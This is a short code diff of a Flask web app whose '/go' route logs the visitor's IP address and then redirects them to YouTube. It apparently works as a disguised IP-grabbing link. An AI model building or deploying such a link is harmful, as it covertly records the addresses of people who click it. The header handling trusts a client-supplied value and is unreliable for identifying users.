@@ -16,15 +16,16 @@ def home():
 
 @app.route('/go')
 def track():
-    # 1. Look for the standard Render/Proxy header
+    # 1. Get the 'X-Forwarded-For' header (a list of IPs)
     x_forwarded = request.headers.get('X-Forwarded-For')
     
     if x_forwarded:
-        # Grab the very first IP in the list (the actual user)
+        # 2. Render puts YOUR IP first in the list.
+        # We split by comma and take the first item [0]
         ip = x_forwarded.split(',')[0].strip()
     else:
-        # 2. Fallback to Real-IP header (used by some providers)
-        ip = request.headers.get('X-Real-IP', request.remote_addr)
+        # 3. Fallback if the header is missing
+        ip = request.remote_addr
 
     log_ip(ip)
     return redirect("https://www.youtube.com")
